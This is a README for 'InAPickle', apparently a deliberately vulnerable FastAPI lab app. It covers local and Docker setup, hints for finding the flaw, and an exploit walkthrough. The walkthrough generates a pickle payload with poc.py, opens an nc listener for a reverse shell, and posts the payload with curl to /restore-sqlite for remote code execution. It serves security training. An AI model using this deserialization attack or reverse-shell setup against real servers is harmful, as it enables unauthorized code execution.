# InAPickle

## Requirements

Local Build:

- Python 3

- Python virtualenv

    ```bash
    python3 -m pip install --user virtualenv
    ```

Docker Build:

- Docker

## Install and Start FastAPI Locally

1. Clone this repo:

    ```bash
    git clone https://github.com/bluemountaincyber/inapickle
    cd inapickle
    ```

2. Start virtual environment:

    ```bash
    python3 -m virtualenv .venv
    . .venv/bin/activate
    ```

3. Install pip packages:

    ```bash
    pip install -r requirements.txt
    ```

4. Start FastAPI with uvicorn:

    ```bash
    uvicorn main:app --reload
    ```

5. App should now be reachable at http://localhost:8000.

## Install and Start FastAPI with Docker

1. Clone this repo:

    ```bash
    git clone https://github.com/bluemountaincyber/inapickle
    cd inapickle
    ```

2. Build docker image:

    ```bash
    docker build -t inapickle .
    ```

3. Start inapickle container:

    ```bash
    docker run -it --rm -p 8000:8000 --name inapickle inapickle
    ```

## Clues that this is exploitable

1. The Pickle icon...

2. The `/docs` page can be found usin `dirb` with the default wordlist (`common.txt`).

3. The `/docs` page is auto-generated and contains descriptions of methods and schemas. This explains that the backup/restore file is pickled Python data.

## Exploit

1. Edit the command you wish to run on the victim server (line 6 in poc.py):

    ```bash
    vim inapickle/poc.py
    ```

2. Run PoC script (generates inapickle/payload.txt):

    ```bash
    python3 inapickle/poc.py
    ```

3. (Optional) Set up listener. For example:

    ```bash
    nc -nlvp 4444
    ```

4. Perform remote code execution:

    ```bash
    curl -L -F 'file=@inapickle/payload.txt' localhost:8000/restore-sqlite
    ```